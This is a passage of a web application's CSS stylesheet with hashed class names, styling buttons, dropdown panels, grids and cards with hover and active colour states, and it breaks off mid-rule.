    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._1vp3OY6p7xnJNOJTXjj5DW {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 30px;
        padding-bottom: 16px
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._1vp3OY6p7xnJNOJTXjj5DW ._2ma1EwyTnKVHtGOoH7v1R5 {
        cursor: pointer;
        user-select: none;
        transition: 0.15s;
        padding: 5px 20px;
        border-radius: 2px;
        color: var(--ah-grey-300);
        display: flex
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._1vp3OY6p7xnJNOJTXjj5DW ._2ma1EwyTnKVHtGOoH7v1R5._1-nXE3evg3-muxQ6KHMU43 {
        color: var(--ah-red-100)
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._1vp3OY6p7xnJNOJTXjj5DW ._2ma1EwyTnKVHtGOoH7v1R5._3u-eEXEI2aRsb2Mkv_Ue2K {
        pointer-events: none
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._1vp3OY6p7xnJNOJTXjj5DW ._2ma1EwyTnKVHtGOoH7v1R5._3u-eEXEI2aRsb2Mkv_Ue2K * {
        pointer-events: none
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._1vp3OY6p7xnJNOJTXjj5DW ._2ma1EwyTnKVHtGOoH7v1R5:hover {
        color: #fff;
        background-color: var(--ah-red-100)
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._1vp3OY6p7xnJNOJTXjj5DW ._2ma1EwyTnKVHtGOoH7v1R5:active {
        color: #fff;
        background-color: var(--ah-red-300)
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._37lIqA6amh13ealPMB7eXb {
        padding: 12px 24px;
        padding-bottom: 0;
        display: flex
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._32p30wFP6hnGKfCKq6kdyO {
        padding: 6px 0;
        margin-right: 8px
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._15C2rWR4wHEv1jxJPeqxVy {
        margin-right: 50px;
        display: flex;
        align-items: center
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2n1X9mLLurIA_Bj6iR3_48 {
        position: relative
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2hE-UYFxgx4PIEJUFP4PZq {
        padding: 8px 12px;
        color: var(--ah-blue-300);
        transition: 0.15s;
        cursor: pointer;
        user-select: none;
        border-radius: 2px
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2hE-UYFxgx4PIEJUFP4PZq:hover {
        color: #fff;
        background-color: var(--ah-blue-100)
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2hE-UYFxgx4PIEJUFP4PZq:active {
        color: #fff;
        background-color: var(--ah-blue-300)
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._31k_zOuFo6htOmhqMVdz6c._31k_zOuFo6htOmhqMVdz6c {
        color: #fff;
        background-color: var(--ah-blue-100)
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2ruCW2p7E3YDZ_b_PQGcaD {
        position: absolute;
        top: calc(100% + 8px);
        right: 0;
        width: 300px;
        background-color: #fff;
        border-radius: 2px;
        border: solid 1px #f5f5f5;
        box-shadow: 0px 5px 15px #ccc
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p .fW01QOD2zpLtAMosoKeZ7 {
        font-weight: bold;
        background-color: #fcfcfc;
        border-bottom: solid 1px #f5f5f5;
        padding: 16px;
        color: var(--ah-grey-100)
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2WQ2inOxavF6cBzqyH8SP9 {
        display: grid;
        grid-template-columns: 64px 1fr;
        gap: 10px;
        padding: 16px
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2WQ2inOxavF6cBzqyH8SP9 .FmTSDroAnhZ2IznCublyP {
        width: 64px;
        height: 64px;
        border-radius: 2px;
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._3Jdlk2rxRDVCIHrj_ZCKh4 {
        margin-bottom: 8px;
        display: block;
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis;
        color: var(--ah-grey-100)
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2ZmHymsz39W83xza12yQYi {
        font-weight: bold;
        color: var(--ah-grey-100)
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._3jQHe_mt0kCp73ElwFkHA2 {
        display: flex;
        gap: 30px;
        justify-content: center;
        align-items: center;
        padding: 16px 0;
        padding-top: 0
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2pWP3GAecn3hPfDmQELuQQ {
        width: 80px;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 8px 12px;
        border-radius: 2px;
        transition: 0.15s;
        cursor: pointer;
        user-select: none;
        font-weight: 600
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2pWP3GAecn3hPfDmQELuQQ.n_jFg3nytHS_EjK0t4ElR {
        color: var(--ah-blue-100)
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2pWP3GAecn3hPfDmQELuQQ._2TDO3ZKroSsfjpsWJzUcVg {
        pointer-events: none;
        color: var(--ah-grey-500) !important
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2pWP3GAecn3hPfDmQELuQQ._2TDO3ZKroSsfjpsWJzUcVg * {
        pointer-events: none;
        color: var(--ah-grey-500) !important
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2pWP3GAecn3hPfDmQELuQQ:hover {
        color: #fff;
        background-color: var(--ah-blue-100)
    }

    ._269Ew2tcq4NFKanFkCpVaC._2cBWaCz-tgMLksQswmio2p ._2pWP3GAecn3hPfDmQELuQQ:active {
        color: #fff;
        background-color: var(--ah-blue-300)
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._2WvCBtdcnXiv8hKMY3OMkt {
        display: flex;
        flex-direction: column;
        justify-content: space-evenly;
        height: 100%
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._2WvCBtdcnXiv8hKMY3OMkt .NGJEzgBAMAI0W5CMrAupW {
        display: flex;
        flex-direction: column;
        margin: 8px 12px
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._2WvCBtdcnXiv8hKMY3OMkt .NGJEzgBAMAI0W5CMrAupW div {
        font-size: 13px
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._2WvCBtdcnXiv8hKMY3OMkt .NGJEzgBAMAI0W5CMrAupW div b {
        display: inline-block;
        font-weight: 600
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._2WvCBtdcnXiv8hKMY3OMkt .NGJEzgBAMAI0W5CMrAupW ._10_X4qhuQ-tVSmBWJAuDkm {
        display: inline-flex;
        justify-content: flex-start;
        align-items: center
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._2WvCBtdcnXiv8hKMY3OMkt .NGJEzgBAMAI0W5CMrAupW ._3FwsOGIfx4cvLq_5lBwCid {
        display: inline-flex;
        width: 24px;
        font-size: 20px;
        margin-right: 8px
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._2WvCBtdcnXiv8hKMY3OMkt .NGJEzgBAMAI0W5CMrAupW ._3FwsOGIfx4cvLq_5lBwCid svg path {
        fill: #2e2e2e
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._2WvCBtdcnXiv8hKMY3OMkt .NGJEzgBAMAI0W5CMrAupW ._3AxuUMRB1A8VKCjDrgqChi {
        display: inline-block;
        margin-left: 10px;
        padding: 3px 6px;
        border-radius: 4px;
        background: var(--ah-warning);
        color: #FFF;
        font-weight: 400;
        text-transform: initial
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._2WvCBtdcnXiv8hKMY3OMkt .NGJEzgBAMAI0W5CMrAupW ._3_Z30cka-s6TzQGLYeFlH5 {
        display: inline-block;
        margin-left: 12px;
        width: 16px;
        height: 16px
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._2WvCBtdcnXiv8hKMY3OMkt .NGJEzgBAMAI0W5CMrAupW ._3_Z30cka-s6TzQGLYeFlH5 svg path {
        fill: var(--ah-success)
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._14ZMReLie6kMiq8rgMxP8C {
        font-weight: bold;
        font-size: 12px;
        line-height: 20px;
        color: var(--ah-grey-100)
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._1yKicLfIS1-XlYWSaEcRSD {
        display: flex;
        align-items: center;
        justify-content: space-between;
        width: 100%
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF .E9vZYbujeQ6Krr5zu0tGQ {
        height: 30px;
        display: flex;
        align-items: center
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._1J4ORxpiAgCATPoinWeqeU {
        align-items: center;
        display: flex
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._1J4ORxpiAgCATPoinWeqeU ._1TSOimXfAMXdAeVmfXNBo1 {
        z-index: 99999;
        display: flex;
        align-items: center;
        gap: 8px;
        padding: 8px 0 8px 0;
        cursor: pointer
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._1J4ORxpiAgCATPoinWeqeU ._1TSOimXfAMXdAeVmfXNBo1 svg {
        width: 16px !important
    }

    .uApflqOP0uou1MKDysMPp.CEEz3G2-JAe1-YIn9umDF ._18_wE-b0xDyKsewjZ8bDBT {
        text-align: center;
        padding: 8px;
        font-size: 10px;
        line-height: 20px;
        color: var(--ah-grey-300)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM {
        padding: 16px 24px;
        padding-top: 0
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .zC-5Ncwr9XHgv2E-H7uL5 {
        display: flex;
        align-items: center;
        gap: 8px;
        color: var(--ah-grey-200);
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        width: 70px
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .zC-5Ncwr9XHgv2E-H7uL5:hover {
        color: var(--ah-red-100)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .zC-5Ncwr9XHgv2E-H7uL5:hover svg path {
        fill: var(--ah-red-100)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._373ejw1AUfA6mrbZdg43WA {
        display: grid;
        grid-template-columns: 1fr auto;
        align-items: center;
        padding: 16px 0;
        border-bottom: solid 1px #f5f5f5
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._373ejw1AUfA6mrbZdg43WA ._1jE2gJS4pj6z6L3B8_uQxz {
        font-weight: bold;
        color: var(--ah-grey-100)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 {
        display: grid;
        grid-template-columns: 1fr 180px 50px
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 .x_jjpypkAN2i0g0Iz45ug {
        padding: 16px 0;
        position: sticky;
        top: 88px;
        background-color: #fff;
        z-index: 1
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._32NWfcByE1El5CqrY2WlVQ {
        padding: 16px 0;
        border-bottom: solid 1px #f5f5f5
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._32NWfcByE1El5CqrY2WlVQ._2Depd142nnC833-jIfk4kE {
        border-bottom: none
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._2UANvt7DZ1EbWuMnQnjG4h {
        display: grid;
        grid-template-columns: 80px 1fr;
        gap: 24px
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._2UANvt7DZ1EbWuMnQnjG4h a {
        cursor: pointer
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._2UANvt7DZ1EbWuMnQnjG4h a * {
        cursor: pointer
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._2UANvt7DZ1EbWuMnQnjG4h ._3j--aEeikYpNX03F5UQzmU {
        width: 80px;
        height: 80px;
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover;
        border-radius: 4px
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._2UANvt7DZ1EbWuMnQnjG4h ._3DNbqiiZPz2-jUdm5MPOjO {
        line-height: 16px;
        color: var(--ah-grey-100);
        margin-bottom: 16px;
        display: block;
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._2UANvt7DZ1EbWuMnQnjG4h ._3DNbqiiZPz2-jUdm5MPOjO:hover {
        color: var(--ah-red-100)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._2UANvt7DZ1EbWuMnQnjG4h ._23BbXBPBtbEwP_uMbGqqWz {
        display: grid;
        grid-template-columns: auto 1fr;
        gap: 16px;
        align-items: center
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._2UANvt7DZ1EbWuMnQnjG4h ._23BbXBPBtbEwP_uMbGqqWz ._2_TiKO4kLprZFZuHXuycHa {
        color: var(--ah-grey-200);
        display: grid;
        align-items: center;
        grid-template-columns: auto auto;
        gap: 8px
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._2UANvt7DZ1EbWuMnQnjG4h ._23BbXBPBtbEwP_uMbGqqWz ._1Suy0kWX_8a5O7WOOhK0ED {
        color: var(--ah-grey-300);
        display: block;
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 1;
        overflow: hidden;
        text-overflow: ellipsis
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 .KqXvYjHdDgqUbgWlxE5EQ {
        color: var(--ah-grey-200)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._3bP4qBFCVJEw8u9Me6Y9v8 {
        color: var(--ah-grey-200)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._2gfy5mndXYw36K_ivrj1RI {
        display: flex;
        align-items: center;
        cursor: pointer;
        user-select: none
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._2gfy5mndXYw36K_ivrj1RI._1eVgZao-7wiBcRfG5fpGOp svg path,
    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1WRP9lG-9mcMJyiTnoCEk7 ._2gfy5mndXYw36K_ivrj1RI:hover svg path {
        fill: var(--ah-red-100)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .qSRlrCfr30D3vwT5V9Kic {
        position: relative;
        display: flex;
        justify-content: flex-end
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .qSRlrCfr30D3vwT5V9Kic ._2V2PsTETk1vXefnF51MMeb {
        position: absolute;
        border: 1px solid #eaeaea;
        box-sizing: border-box;
        border-radius: 2px;
        width: 286px;
        right: 0;
        background-color: #fff;
        z-index: 9;
        top: calc(100% + 8px);
        box-shadow: 0px 0px 15px #dedede
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .qSRlrCfr30D3vwT5V9Kic ._2V2PsTETk1vXefnF51MMeb ._2rcyp_iPwWVTdEGhDIW3kR {
        color: var(--ah-red-100);
        padding: 16px;
        font-weight: bold;
        border-bottom: solid 1px #f5f5f5
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .qSRlrCfr30D3vwT5V9Kic ._2V2PsTETk1vXefnF51MMeb ._2aadlikV1PVYqEWxg7CX6W {
        padding: 16px
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .qSRlrCfr30D3vwT5V9Kic ._2V2PsTETk1vXefnF51MMeb ._2aadlikV1PVYqEWxg7CX6W ._1lS6r9DLfPCKHBGw0udFpq {
        font-weight: bold;
        line-height: 20px;
        color: var(--ah-grey-100);
        margin-bottom: 8px;
        text-align: center
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .qSRlrCfr30D3vwT5V9Kic ._2V2PsTETk1vXefnF51MMeb .CE78rLro7npfCbp-FgFGw {
        margin-top: 24px;
        display: flex;
        gap: 30px;
        justify-content: center
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .qSRlrCfr30D3vwT5V9Kic ._2V2PsTETk1vXefnF51MMeb .CE78rLro7npfCbp-FgFGw ._3iATUEa8X7MTCuW6mllKi- {
        width: 70px;
        height: 30px;
        display: flex;
        align-items: center;
        justify-content: center;
        user-select: none;
        cursor: pointer;
        border-radius: 2px;
        color: var(--ah-grey-300);
        transition: 0.15s
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .qSRlrCfr30D3vwT5V9Kic ._2V2PsTETk1vXefnF51MMeb .CE78rLro7npfCbp-FgFGw ._3iATUEa8X7MTCuW6mllKi-._1JWa4PmiCKEBwkb58ap79 {
        color: var(--ah-red-100)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .qSRlrCfr30D3vwT5V9Kic ._2V2PsTETk1vXefnF51MMeb .CE78rLro7npfCbp-FgFGw ._3iATUEa8X7MTCuW6mllKi-:hover {
        color: #fff;
        background-color: var(--ah-red-100)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .qSRlrCfr30D3vwT5V9Kic ._2V2PsTETk1vXefnF51MMeb .CE78rLro7npfCbp-FgFGw ._3iATUEa8X7MTCuW6mllKi-:active {
        color: #fff;
        background-color: var(--ah-red-300)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .qSRlrCfr30D3vwT5V9Kic ._2V2PsTETk1vXefnF51MMeb .CE78rLro7npfCbp-FgFGw ._3iATUEa8X7MTCuW6mllKi-._3vKC6WYlwaFE3gfjCO6YDV {
        pointer-events: none;
        color: var(--ah-grey-500) !important;
        background-color: transparent
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM .qSRlrCfr30D3vwT5V9Kic ._2V2PsTETk1vXefnF51MMeb .CE78rLro7npfCbp-FgFGw ._3iATUEa8X7MTCuW6mllKi-._3vKC6WYlwaFE3gfjCO6YDV * {
        color: var(--ah-grey-500) !important;
        background-color: transparent;
        pointer-events: none
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._3pPBp_7dePUXEFw95i-KnR {
        position: relative
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._3f55TWQpUUuHqsoJW1IDxq {
        display: flex;
        align-items: center;
        gap: 8px;
        color: var(--ah-grey-200);
        font-weight: 600;
        cursor: pointer;
        user-select: none
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._3f55TWQpUUuHqsoJW1IDxq:hover {
        color: var(--ah-red-100)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._3f55TWQpUUuHqsoJW1IDxq._3HtrmwAZvYSz1LW1ERohF1 {
        color: var(--ah-red-100)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1JnbS_074yo2p5Ti98P-6e {
        position: absolute;
        border: 1px solid #eaeaea;
        box-sizing: border-box;
        border-radius: 2px;
        width: 286px;
        right: 0;
        background-color: #fff;
        z-index: 9;
        top: calc(100% + 8px);
        box-shadow: 0px 0px 15px #dedede
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1JnbS_074yo2p5Ti98P-6e ._2rcyp_iPwWVTdEGhDIW3kR {
        color: var(--ah-red-100);
        padding: 16px;
        font-weight: bold;
        border-bottom: solid 1px #f5f5f5
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1JnbS_074yo2p5Ti98P-6e ._2aadlikV1PVYqEWxg7CX6W {
        padding: 16px
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1JnbS_074yo2p5Ti98P-6e ._2aadlikV1PVYqEWxg7CX6W ._1lS6r9DLfPCKHBGw0udFpq {
        font-weight: bold;
        line-height: 20px;
        color: var(--ah-grey-100);
        margin-bottom: 8px;
        text-align: center
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1JnbS_074yo2p5Ti98P-6e .CE78rLro7npfCbp-FgFGw {
        margin-top: 24px;
        display: flex;
        gap: 30px;
        justify-content: center
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1JnbS_074yo2p5Ti98P-6e .CE78rLro7npfCbp-FgFGw ._3iATUEa8X7MTCuW6mllKi- {
        width: 70px;
        height: 30px;
        display: flex;
        align-items: center;
        justify-content: center;
        user-select: none;
        cursor: pointer;
        border-radius: 2px;
        color: var(--ah-grey-300);
        transition: 0.15s
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1JnbS_074yo2p5Ti98P-6e .CE78rLro7npfCbp-FgFGw ._3iATUEa8X7MTCuW6mllKi-._1JWa4PmiCKEBwkb58ap79 {
        color: var(--ah-red-100)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1JnbS_074yo2p5Ti98P-6e .CE78rLro7npfCbp-FgFGw ._3iATUEa8X7MTCuW6mllKi-:hover {
        color: #fff;
        background-color: var(--ah-red-100)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1JnbS_074yo2p5Ti98P-6e .CE78rLro7npfCbp-FgFGw ._3iATUEa8X7MTCuW6mllKi-:active {
        color: #fff;
        background-color: var(--ah-red-300)
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1JnbS_074yo2p5Ti98P-6e .CE78rLro7npfCbp-FgFGw ._3iATUEa8X7MTCuW6mllKi-._3vKC6WYlwaFE3gfjCO6YDV {
        pointer-events: none;
        color: var(--ah-grey-500) !important;
        background-color: transparent
    }

    ._2zTJwXqiIA8I38ZJ1uW9Z6._3-o_D_eH2m5P8y7DW1hvCM ._1JnbS_074yo2p5Ti98P-6e .CE78rLro7npfCbp-FgFGw ._3iATUEa8X7MTCuW6mllKi-._3vKC6WYlwaFE3gfjCO6YDV * {
        color: var(--ah-grey-500) !important;
        background-color: transparent;
        pointer-events: none
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U {
        width: 100%;
        border-radius: 8px;
        border: 1px solid #f5f5f5;
        box-sizing: border-box;
        padding: 16px;
        margin-bottom: 20px
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U .V7RcY7WmuWbZtatzJ4QPL {
        display: flex;
        align-items: center;
        justify-content: space-between
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U .V7RcY7WmuWbZtatzJ4QPL ._1Nqo8slR72kZnbm8ORSi_b {
        display: flex;
        color: var(--ah-yellow-300)
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U .V7RcY7WmuWbZtatzJ4QPL ._1Nqo8slR72kZnbm8ORSi_b svg {
        margin-right: 8px
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U .V7RcY7WmuWbZtatzJ4QPL ._3RVBADHOkeme3CraQDcLFr {
        display: flex
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U .V7RcY7WmuWbZtatzJ4QPL ._3RVBADHOkeme3CraQDcLFr ._2NktTZVypH57sx2CVYejri {
        display: flex;
        align-items: center;
        padding: 5px 12px;
        border-radius: 30px;
        margin-left: 12px;
        font-size: 11px
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U .V7RcY7WmuWbZtatzJ4QPL ._3RVBADHOkeme3CraQDcLFr ._2NktTZVypH57sx2CVYejri svg {
        margin-right: 6px
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U ._3vOH5R6GJ-WFecAE3GxqNL {
        display: flex;
        justify-content: space-around;
        width: 100%
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U .sz0IpW_LBwN-4Lm17CKBc {
        width: 110px
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U ._2_mVECeS4bS-ik96u0rXEo,
    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U .SmHEdizJJTsryR7RSAU77 {
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U ._2_mVECeS4bS-ik96u0rXEo {
        color: var(--ah-grey-200);
        font-size: 12px;
        line-height: 20px;
        margin-bottom: 4px
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U .LQ0o83M-IBP8txVVR832E {
        width: 1px;
        height: 40px;
        background-color: var(--ah-grey-700)
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U .SmHEdizJJTsryR7RSAU77 {
        color: var(--ah-grey-100);
        font-weight: 700;
        font-size: 14px;
        line-height: 22px
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U .SmHEdizJJTsryR7RSAU77 div {
        display: flex
    }

    ._2IgN611D6kUYpg6nuD5-TZ._2nuWNww2IqH4FPgLlMUq2U .SmHEdizJJTsryR7RSAU77 svg {
        margin-right: 8px
    }

    ._3mcCwgfKRlr_taUmChcraA._1B783aRPsZhlEzQdi0JTxk {
        box-sizing: border-box;
        border-radius: 8px;
        margin-bottom: 24px
    }

    ._3mcCwgfKRlr_taUmChcraA .NNgyZW0jeoBcuylNDJEUx {
        position: relative;
        margin-top: 15px;
